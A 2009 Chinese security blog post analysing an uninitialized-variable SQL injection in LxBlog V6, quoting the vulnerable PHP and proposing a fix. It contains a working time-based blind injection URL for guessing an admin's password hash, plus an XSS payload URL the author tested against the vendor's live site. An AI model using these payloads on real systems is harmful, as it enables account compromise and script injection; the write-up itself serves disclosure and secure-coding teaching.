---
title: 浅析LxBlog V6变量未初始化漏洞
description: 《浅析LxBlogV6变量未初始化漏洞》作者：Flyh4t本文已经发表在黑客防线,转载请署名Lxblog是PHPWind开发的一套基于PHP+MySQL数据库平台架构的多用户博客系统，强调整站与用户个体间的交互，拥有强大的个人主页系统、独立的二级域名体系、灵活的用户模板系统、丰富的朋友圈和相册功能。但是该blog系统在安全性上并不让人满意，本文就来分析lxblog一个变量未初始化造成的sql注入漏洞。
date: 2009-03-24 10:25:30
category: 漏洞信息
tags: ['LxBlog', '漏洞信息', '注入']
post_id: 823
alias: LxBlog-V6-Uninitialized-variable-vulnerability
ViewNums: 3144
---

《[浅析LxBlog V6变量未初始化漏洞](/blog/lxblog-v6-uninitialized-variable-vulnerability)》作者：[Flyh4t](http://bbs.wolvez.org/post/174/)

本文已经发表在黑客防线,转载请署名

Lxblog 是 PHPWind 开发的一套基于 PHP+MySQL 数据库平台架构的多用户博客系统，强调整站与用户个体间的交互，拥有强大的个人主页系统、独立的二级域名体系、灵活的用户模板系统、丰富的朋友圈和相册功 能。但是该blog系统在安全性上并不让人满意，本文就来[分析lxblog一个变量未初始化造成的sql注入漏洞](/blog/lxblog-v6-uninitialized-variable-vulnerability)。

我们先来分析一下这个漏洞，看代码：

=======================code==================================
/user/tag.php
```php
<?php
!function_exists('usermsg') && exit('Forbidden');
!in_array($type,$item_type) && exit;
//$type、$item_type均没有初始化
require_once(R_P.'mod/charset_mod.php');
foreach ($_POST as $key => $value) {
    ${'utf8_'.$key} = $value;
    ${$key} = $db_charset != 'utf-8' ? convert_charset('utf-8',$db_charset,$value) : $value;
}

if ($job == 'add') {
    ……//省略部分代码
}elseif($job=="modify"){
    $tagnum="{$type}num";
    $touchtagdb=$db->get_one("SELECT k.tags,i.uid FROM pw_{$type} k LEFT JOIN pw_items i ON i.itemid=k.itemid WHERE k.itemid='$itemid'");
    //$type带入查询语句操作数据库
    $touchtagdb['uid']!=$admin_uid && exit;
……//省略部分代码
```
=======================code==================================

当 然，在文件的第一行有 !function_exists('usermsg') && exit('Forbidden'); 这样一段代码的限制，我们不能直接访问该文件，但是可以通过user_index.php来include这个文件执行，看具体代码

=======================code==================================
//user_index.php
```php
<?php
……//省略部分代码
require_once(R_P.'user/global.php');
require_once(R_P.'user/top.php');

if (!$action) {
    ……//省略部分代码
} elseif ($action && file_exists(R_P."user/$action.php")) {
    $basename = "$user_file?action=$action";
    require_once(Pcv(R_P."user/$action.php"));
   //通过提交$action=tag即可以调用到存在漏洞的文件
}
……//省略部分代码
```
=======================code==================================

看到这个地方，应该已经可以触发该漏洞了，但是依然要考虑到是否会受到register_global的影响，幸好user_index.php在开始的时候包含了user/global.php这个文件，看看这个文件为我们提供了什么

=======================code==================================
//user/global.php
```php
<?
……//省略部分代码
if (!in_array($action,array('blogdata','comment','itemcp','post','userinfo'))) {
    //'blogdata','comment','itemcp','post','userinfo','global','top'
//我们提交的action=tag，不在上面这个数组里面，可以触发下面的代码成功绕过register_global的影响
    foreach ($_POST as $_key => $_value) {
        !ereg('^\_',$_key) && strlen(${$_key})<1 && ${$_key} = $_POST[$_key];
    }
    foreach ($_GET as $_key => $_value) {
        !ereg('^\_',$_key) && strlen(${$_key})<1 && ${$_key} = $_GET[$_key];
    }
}
……//省略部分代码
```
=======================code==================================

通过上面的分析，我们已经可以成功控制$type和$item_type的值了，但是还要注意两个地方：

第一个地方是要满足 in_array($type,$item_type)，我们通过直接将$type和$item_type[]赋值为相同变量即可

第二个地方是要注意我们注射的语句
```
$touchtagdb=$db->get_one("SELECT k.tags,i.uid FROM pw_{$type} k LEFT JOIN pw_items i ON i.itemid=k.itemid WHERE k.itemid='$itemid'");
```
综合以上，我们构造出来盲注的代码如下

=======================poc==================================
```
//判断uid=1的用户的密码第一位的ASCII值是否大于0
http://blog.xxx.com/user_index.php?action=tag&job=modify&type=blog k LEFT JOIN pw_user i ON 1=1 WHERE i.uid =1 AND if((ASCII(SUBSTRING(password,1,1))>0),sleep(10),1)/*&item_type[]=blog k LEFT JOIN pw_user i ON 1=1 WHERE i.uid    =1 AND if((ASCII(SUBSTRING(password,1,1))>0),sleep(10),1)/*
```
=======================poc==================================

通过浏览器返回的时间来判断是否猜解正确，如果是正确的话，浏览器返回的比较慢，近似假死状态，否则返回的就比较正常。使用二分法不断猜解即可。另外，如果 数据库版本较低，可以使用benchmark函数来盲注，具体的expliot就不提供了，有需要的可以自己写个代码跑跑，不是什么难事。

另外我们看下lxblog的数据库容错代码

=======================code==================================
```
function DB_ERROR($msg) {
        global $db_blogname,$REQUEST_URI;
        $sqlerror = mysql_error();
        $sqlerrno = mysql_errno();
        //ob_end_clean();
        echo"<html><head><title>$db_blogname</title><style type='text/css'>P,BODY{FONT-FAMILY:tahoma,arial,sans-serif;FONT-SIZE:11px;}A { TEXT-DECORATION: none;}a:hover{ text-decoration: underline;}TD { BORDER-RIGHT: 1px; BORDER-TOP: 0px; FONT-SIZE: 16pt; COLOR: #000000;}</style><body>
";
        echo"<table style='TABLE-LAYOUT:fixed;WORD-WRAP: break-word'><tr><td>$msg";
        echo"<br><br><b>The URL Is</b>:<br>http://$_SERVER[HTTP_HOST]$REQUEST_URI";
        echo"<br><br><b>MySQL Server Error</b>:<br>$sqlerror  ( $sqlerrno )";
        echo"<br><br><b>You Can Get Help In</b>:<br><a target=_blank href=http://www.phpwind.net><b>http://www.phpwind.net</b></a>";
        echo"</td></tr></table>";
        exit;
    }
```
=======================code==================================

函数直接将造成数据库错误的url返回给客户端，对输出未作任何过滤，造成了xss漏洞，下面是我对官方的测试：

=======================poc==================================
```
http://www.lxblog.net/user_index.php?action=tag&job=modify&type=<script>alert(/xss/)</script>&item_type[]=<script>alert(/xss/)</script>
```
=======================poc==================================

Lxblog 的漏洞就分析到这里了，这个漏洞的修补也很简单，只要在数据库查询语句前面将变量$item_type赋值为指定的数组就可以了。网上的PHP程序有不少 都存在类似的漏洞，由于变量没有被正确的初始化，从而导致攻击者可以控制变量被改变程序的流程执行一些非法操作。其实这个问题并不复杂，保持一个良好的编 码习惯，正确初始化类和变量即可杜绝此类漏洞。

